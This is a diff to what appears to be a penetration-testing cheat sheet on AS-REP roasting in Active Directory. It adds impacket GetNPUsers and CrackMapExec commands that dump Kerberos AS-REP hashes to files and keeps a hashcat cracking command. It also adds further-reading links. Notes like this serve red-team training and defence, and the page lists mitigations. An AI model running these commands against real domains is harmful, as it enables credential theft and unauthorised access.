@@ -45,10 +45,13 @@ Get-ADUser -Filter { DoesNotRequirePreAuth -eq $true } -Properties DoesNotRequir
 
 # Query AS-REP-roastable users with impacket from Kali host
 # Supply userlist and don't require authentication
-GetNPUsers.py -dc-ip 10.10.149.145 -k -no-pass -usersfile users.txt spookysec.local/
+GetNPUsers.py -dc-ip 10.10.149.145 -no-pass -usersfile users.txt -format hashcat -outputfile hashes.asrep spookysec.local/
 
 # Dump KRBASREP5 hash for specific user and output in hashcat format to file
 .\Rubeus.exe asreproast /user:control572user /format:hashcat /outfile:control572user.asrep
+
+# Dump hashes with credentials using CrackMapExec
+crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --asreproast output.txt
 
 # Transfer hash onto attacker and insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....
 # Crack hash with hashcat
@@ -59,3 +62,9 @@ hashcat -a 0 -m 18200 hash.txt rockyou.txt
 
 - Strong password policy
 - Enable Kerberos Pre-Authentication
+
+## Further Reading
+
+- [iRedTeam: AS-REP Roasting](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
+- [XPN: Kerberos AD Attacks - More Roasting with AS-REP](https://blog.xpnsec.com/kerberos-attacks-part-2/)
+- [harmj0y: Roasting AS-REPs](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)
